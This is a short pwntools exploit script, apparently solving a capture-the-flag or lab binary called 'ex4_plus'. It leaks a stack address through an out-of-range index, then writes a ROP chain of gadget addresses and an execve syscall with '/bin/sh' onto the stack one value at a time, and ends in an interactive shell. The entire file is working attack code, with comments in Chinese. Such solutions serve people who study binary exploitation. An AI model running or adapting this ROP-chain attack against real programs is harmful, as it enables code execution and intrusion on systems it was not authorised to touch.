from pwn import *


"""
#pop eax ; ret
#pop ebx ; ret
#pop ecx ; pop ebx ; ret
#pop edx ; ret
#int 0x80

"""
eax_addr = 0x0805c34b
ebx_addr = 0x080481d1
ecx_addr = 0x080701d1
edx_addr = 0x080701aa
int_addr = 0x08049a21

rop = [eax_addr, 0x0b, ecx_addr, 0, 0, edx_addr, 0, int_addr, u32("/bin"), u32("/sh\x00")]

sh = process("./ex4_plus")
sh.recvuntil("\n")

sh.sendline("+360")
main_ebp = int(sh.recvuntil("\n",drop=True))
main_ebp = 0x100000000 + main_ebp  # 泄漏的是负数
# 获得/bin/sh字符串在栈里的位置
rop[4] = main_ebp - 0x20 + 9 * 4

for i in range(len(rop)):
    payload = f"+{str(361 + i)}"
    sh.sendline(payload)
    # 先泄露原来的值
    num = int(sh.recvuntil("\n", drop=True))
    offset = rop[i] - num

    payload_ = payload + str(offset) if offset < 0 else f"{payload}+{str(offset)}"
    sh.sendline(payload_)
    value = int(sh.recv(1024))
    if value < 0:
        value += 0x100000000

    while value != rop[i]:
        offset = rop[i] - value
        if offset < 0:
            sh.sendline(payload + str(offset))
        else:
            sh.sendline(f"{payload}+{str(offset)}")
        value = int(sh.recv(1024))
        if value < 0:
            value += 0x100000000

sh.sendline(b"A")
sh.interactive()

